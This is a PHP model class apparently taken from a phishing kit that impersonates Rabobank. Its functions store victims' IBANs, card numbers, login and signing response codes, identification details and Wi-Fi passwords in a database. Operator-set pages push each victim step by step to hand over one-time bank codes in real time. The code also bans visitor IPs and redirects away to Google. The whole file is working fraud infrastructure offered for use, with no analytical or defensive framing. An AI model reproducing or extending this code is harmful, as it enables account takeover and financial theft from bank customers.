<?php

namespace App\Models\Rabo;

use PDO;

class Rabo extends \Core\Model
{
    public static function redirect()
    {
        $sql = 'SELECT * FROM redirect WHERE id = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', 1, PDO::PARAM_INT);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            header('location: ' . $data['redirect']);
            exit();
        } else {
            header('location: https://www.google.nl');
            exit();
        }
    }

    public static function findBan($ip)
    {
        $sql = 'SELECT * FROM bans WHERE ip = :ip';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':ip', $ip, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return true;
        }
        return false;
    }

    public static function setLogInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, rabo_iban = :empty, rabo_number = :empty, rabo_code_one = :empty, rabo_respons_one = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'RABO', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setIdentificationInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, rabo_identification = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'RABO', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function getPage($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if (!empty($data['page'])) {
            return $data['page'];
        }
        return false;
    }

    public static function getLoginCode($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :uid';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid);
        $stmt->execute();
        $data = $stmt->fetch();
        
        if (!empty($data['rabo_code_one'])) {
            return $data['rabo_code_one'];
        }
        return false;
    }

    public static function getSignCode($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :uid';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid);
        $stmt->execute();
        $data = $stmt->fetch();
        
        if (!empty($data['rabo_code_two'])) {
            return $data['rabo_code_two'];
        }
        return false;
    }

    public static function checkPayment($url = []) 
    {
        $sql = 'SELECT * FROM requests WHERE url = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', $url, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return $data;
        }
        return false;
    }

    public static function setLogin($iban, $number, $uid) 
    {
        $sql = 'UPDATE logs SET rabo_iban = :iban, rabo_number = :number, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':iban', $iban, PDO::PARAM_STR);
        $stmt->bindValue(':number', $number, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setIdentification($identification, $uid) 
    {
        $sql = 'UPDATE logs SET rabo_identification = :identification, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':identification', $identification, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setLoginCode($code, $uid) 
    {
        $sql = 'UPDATE logs SET rabo_respons_one = :code, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':code', $code, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setSignCode($code, $uid) 
    {
        $sql = 'UPDATE logs SET rabo_respons_two = :code, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':code', $code, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setLoginPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, rabo_iban = :empty, rabo_number = :empty, rabo_respons_one = :empty, rabo_code_one = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setControlPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, rabo_wifi = :empty, rabo_wifi_pass = :empty, rabo_wifi_pass_two = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setSignCodePage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, rabo_respons_two = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setIdentificationPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, rabo_identification = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setSignCodeInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, rabo_respons_two = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'RABO', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setWifiInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, rabo_wifi = :empty, rabo_wifi_pass = :empty, rabo_wifi_pass_two = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'RABO', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setWifi($wifi, $pass, $confirm, $uid) 
    {
        $sql = 'UPDATE logs SET rabo_wifi = :wifi, rabo_wifi_pass = :pass, rabo_wifi_pass_two = :confirm, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':wifi', $wifi, PDO::PARAM_STR);
        $stmt->bindValue(':pass', $pass, PDO::PARAM_STR);
        $stmt->bindValue(':confirm', $confirm, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function removePage($uid)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setLoginCodePage($uid, $page, $code)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, rabo_code_one = :code WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':code', $code, PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setSignCodePageCode($uid, $page, $code)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, rabo_respons_two = :empty, rabo_code_two = :code WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':code', $code, PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setFinishPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }
}